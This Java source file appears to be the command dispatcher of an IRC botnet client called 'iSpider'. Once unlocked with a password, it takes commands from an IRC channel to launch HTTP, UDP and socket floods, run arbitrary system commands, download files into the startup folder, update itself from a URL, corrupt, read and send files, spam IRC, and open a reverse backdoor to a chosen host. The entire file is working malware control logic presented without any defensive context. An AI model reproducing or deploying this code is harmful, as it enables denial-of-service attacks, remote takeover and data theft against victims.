class CommandInterpreter {

	private static final String botPassword = ConfigDefaults.PASSWORD_BOT;
	private CAC cac;

	public CommandInterpreter(CAC cac) {
		this.cac = cac;
	}

	public void line(String line) {
		if(line.indexOf("PRIVMSG") == -1) {
			return;
		}
		String command = this.cac.getIRCSocket().getIRC().getMessage(line);
		if(command.startsWith(".")) {
				String channel = this.cac.getIRCSocket().getIRC().getChannel(line);
				if(!channel.equals("null") && !channel.equals(this.cac.getIRCSocket().getConfig().getOutChannel())) {
					this.command(channel, command);
				}
			}
		}

	private void command(String channel, String message) {
		if(channel.equals(this.cac.getIRCSocket().getConfig().getInChannel())) {
			channel = this.cac.getIRCSocket().getConfig().getOutChannel();
		}
		String args[] = Util.splitArgs(message);
		Debug.print("Args length: " + args.length + "\n");
		String command = args[0];
		String directCmdTo = null;
		if(!Config.getBotsUnlocked()) {
			if(command.startsWith(".unlock-" + botPassword)) {
				Config.setBotsUnlocked(true);
				this.cac.getIRCSocket().getIRC().sendMessage(channel, "iSpider Unlocked Succesfully.");
		}
		
		} else
		if(!Commands.contain(command)) {
			this.cac.getIRCSocket().getIRC().sendMessage(channel, "Command dont exist:" + command);
		} else {
			if(command.equals(".commands")) {
				Commands.printCommands(this.cac.getIRCSocket().getIRC(), channel);
			} else if(command.equals(".info")) {
				this.cac.getIRCSocket().getIRC().sendMessage(channel, "iSpider info: " + Constants.BOT_VERSION);
			} else if(command.equals(".exit")) {
				System.exit(-1);
			} else if(command.equals(".quit")) {
				if(args.length == 2) {
					this.cac.getIRCSocket().getIRC().quit(args[1]);
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".join")) {
				if(args.length == 2) {
					this.cac.getIRCSocket().getIRC().join(args[1]);
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".part")) {
				if(args.length == 2) {
					this.cac.getIRCSocket().getIRC().part(args[1]);
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".nick")) {
				if(args.length == 2) {
					this.cac.getIRCSocket().getIRC().nick(args[1]);
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".rename")) {
				if(args.length == 2) {
					this.cac.getIRCSocket().getExternalSettings().properties.setProperty("PERM_NICK", args[1]);
					this.cac.getIRCSocket().getExternalSettings().save();
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".say")) {
				if(args.length == 3) {
					this.cac.getIRCSocket().getIRC().sendMessage(args[1], args[2]);
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".download")) {
				if(args.length == 3) {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Downloading " + args[1] + " to " + args[2] + "... ");
					Download download = new Download(args[1]);
					String result = download.download(args[2]);
				} else if(args.length == 2) {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Downloading " + args[1] + " to startup folder... ");
					Download download = new Download(args[1]);
					String result = download.download(Util.findStartup());
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".cmd")) {
				if(args.length == 2) {
					new SystemExec(args[1], this.cac.getIRCSocket().getIRC(), channel);
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.startsWith(".lock-" + botPassword)) {
				Config.setBotsUnlocked(false);
				this.cac.getIRCSocket().getIRC().sendMessage(channel, "iSpider Locked Succesfully.");
		}else if(command.equals(".httpflood")) {
				if(args.length == 5) {
					try {
						int threads = Integer.parseInt(args[2]);
						if(threads > 0) {
							FloodingStatus.httpFlooding = true;
							for(int i = 0; i < threads; i++) {
								new HTTPFlood(args[1], Integer.parseInt(args[3]), Integer.parseInt(args[4]));
							}
						}
					} catch(NumberFormatException nfe) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "Bad syntax.");
					}
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".udpflood")) {
				if(args.length == 5) {
					try {
						int threads = Integer.parseInt(args[2]);
						if(threads > 0) {
							FloodingStatus.udpFlooding = true;
							for(int i = 0; i < threads; i++) {
								new UDPFlood(args[1], Integer.parseInt(args[3]), Integer.parseInt(args[4]));
							}
						}
					} catch(NumberFormatException nfe) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "Bad syntax.");
					}
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".sflood")) {
				if(args.length == 6) {
					try {
						int threads = Integer.parseInt(args[3]);
						if(threads > 0) {
							FloodingStatus.socketFlooding = true;
							for(int i = 0; i < threads; i++) {
								new SocketFlood(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[4]), Integer.parseInt(args[5]));
							}
						}
					} catch(NumberFormatException nfe) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "Bad syntax.");
					}
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".getOS")) {
				if (directCmdTo != null && directCmdTo.equals(Config.getNick()))
				{
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "My OS is " +System.getProperty("os.name"));
					return;
				}
				if(directCmdTo == null) {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "My OS is " +System.getProperty("os.name"));
				}
			}else if (command.startsWith(".directCommandTo"))
			{
				directCmdTo = args[1];
				this.cac.getIRCSocket().getIRC().sendMessage(channel, (new StringBuilder("Directing commands to ")).append(args[1]).toString());
			}		else if (command.equals(".resetDirect"))
			{
				this.cac.getIRCSocket().getIRC().sendMessage(channel, "Not directing commands to individuals!");
				directCmdTo = null;
			}else if(command.equals(".stopfloods")) {
				if(FloodingStatus.httpFlooding) {
					FloodingStatus.httpFlooding = false;
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Stopped HTTP flooding.");
				}
				if(FloodingStatus.udpFlooding) {
					FloodingStatus.udpFlooding = false;
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Stopped UDP flooding.");
				}
				if(FloodingStatus.socketFlooding) {
					FloodingStatus.socketFlooding = false;
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Stopped socket flooding.");
				} else {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "There are no attacks to stop.");
				}
			} else if(command.equals(".getip")) {
				if(args.length == 2) {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, Util.getIPAddress(args[1]));
				} else {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, Util.getIPAddress());
				}
			} else if(command.equals(".shell")) {
				Shell shell = Shell.getShell(channel);
				if(shell == null) {
					new Shell(this.cac.getIRCSocket().getIRC(), channel);
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Created new shell for channel " + channel + " successfully.");
				} else {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Shell already exists for this channel.");
				}
			} else if(command.equals(".folder")) {
				if(args.length == 2) {
					Shell shell = Shell.getShell(channel);
					if(shell == null) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "No shell found for this channel."); 
					} else {
						shell.mkdir(args[1]);
					}
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".cd")) {
				if(args.length == 2) {
					Shell shell = Shell.getShell(channel);
					if(shell == null) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "No shell found for this channel."); 
					} else {
						shell.cd(args[1]);
					}
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".list")) {
				Shell shell = Shell.getShell(channel);
				if(shell == null) {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "No shell found for this channel.");
				} else {
					shell.ls();
				}
			}else if(command.equals(".corrupt")) {
				if(args.length == 3) {
					FileCorrupt corrupt = new FileCorrupt(this.cac.getIRCSocket().getIRC(), channel, args[1]);
					corrupt.corrupt(args[2]);
				} else if(args.length == 2) {
					FileCorrupt corrupt = new FileCorrupt(this.cac.getIRCSocket().getIRC(), channel, args[1]);
					corrupt.corrupt();
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".update")) {
				if(args.length == 2) {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Updating bot... ");
					BotUpdater updater = new BotUpdater(this.cac.getIRCSocket().getIRC(), channel, args[1]);
					updater.start();
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".zip")) {
				if(args.length == 3) {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Zipping " + args[1] + " to " + args[2] + "...");
					Zip zip = new Zip(this.cac.getIRCSocket().getIRC(), channel, args[1], args[2]);
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".send")) {
				if(args.length == 4) {
					try {
						new FileSend(this.cac.getIRCSocket().getIRC(), channel, args[2], Integer.parseInt(args[3]), args[1]);
					} catch(NumberFormatException nfe) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "Bad syntax.");
					}
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".read")) {
				if(args.length == 3) {
					try {
						new FileRead(this.cac.getIRCSocket().getIRC(), channel, args[1], Integer.parseInt(args[2]));
					} catch(NumberFormatException nfe) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "Bad syntax.");
					}
				} else {
					this.printUsage(channel, command);
				}
			} else if(command.equals(".spam")) {
				if(args.length == 9) {
					try {
						SpammingStatus.spamming = true;
						new IRCSpammer(this.cac.getIRCSocket().getIRC(), channel, args[1], Integer.parseInt(args[2]), args[3], args[4], args[5], args[6], Integer.parseInt(args[7]), Integer.parseInt(args[8]));
					} catch(NumberFormatException nfe) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "Bad syntax.");
					}
				} else if(args.length == 8) {
					try {
						SpammingStatus.spamming = true;
						new IRCSpammer(this.cac.getIRCSocket().getIRC(), channel, args[1], Integer.parseInt(args[2]), args[3], "", args[4], args[5], Integer.parseInt(args[6]), Integer.parseInt(args[7]));
					} catch(NumberFormatException nfe) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "Bad syntax.");
					}
				} else {
					this.printUsage(channel, command);
				}				
			} else if(command.equals(".stopspam")) {
				if(SpammingStatus.spamming) {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "Stopped all IRC spamming.");
				} else {
					this.cac.getIRCSocket().getIRC().sendMessage(channel, "No IRC spamming to stop.");
				}
			} else if(command.equals(".backdoor")) {
				if(args.length == 3) {
					try {
						(new ReverseBackdoor(this.cac.getIRCSocket().getIRC(), channel, args[1], Integer.parseInt(args[2]))).start();
					} catch(NumberFormatException nfe) {
						this.cac.getIRCSocket().getIRC().sendMessage(channel, "Bad syntax.");
					}
				} else {
					this.printUsage(channel, command);

				}
			} 
		}
	}

	private void printUsage(String channel, String command) {
		this.cac.getIRCSocket().getIRC().sendMessage(channel, "Usage: " + Commands.getUsage(command));
	}

}